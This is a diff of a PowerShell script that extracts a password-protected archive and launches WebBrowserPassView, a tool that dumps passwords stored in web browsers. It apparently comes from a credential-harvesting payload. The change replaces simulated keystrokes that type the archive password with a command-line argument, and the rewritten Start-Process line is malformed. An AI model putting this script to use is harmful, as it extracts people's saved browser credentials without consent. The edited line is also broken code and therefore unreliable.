@@ -16,24 +16,9 @@ Start-Sleep -Seconds 5
 
 Expand-Archive '7z.zip'
 
-Start-Process -FilePath '.\7z\7za.exe' -ArgumentList "e 'wbpv.zip'" -Wait
-
-Add-Type -AssemblyName System.Windows.Forms
+Start-Process -FilePath '.\7z\7za.exe e wbpv.zip -wbpv28821@'" -Wait
 
 Start-Sleep -Seconds 5
-
-[System.Windows.Forms.SendKeys]::SendWait('w')
-[System.Windows.Forms.SendKeys]::SendWait('b')
-[System.Windows.Forms.SendKeys]::SendWait('p')
-[System.Windows.Forms.SendKeys]::SendWait('v')
-[System.Windows.Forms.SendKeys]::SendWait('2')
-[System.Windows.Forms.SendKeys]::SendWait('8')
-[System.Windows.Forms.SendKeys]::SendWait('8')
-[System.Windows.Forms.SendKeys]::SendWait('2')
-[System.Windows.Forms.SendKeys]::SendWait('1')
-[System.Windows.Forms.SendKeys]::SendWait('@')
-
-[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
 Start-Process -FilePath '.\WebBrowserPassView.exe'
 
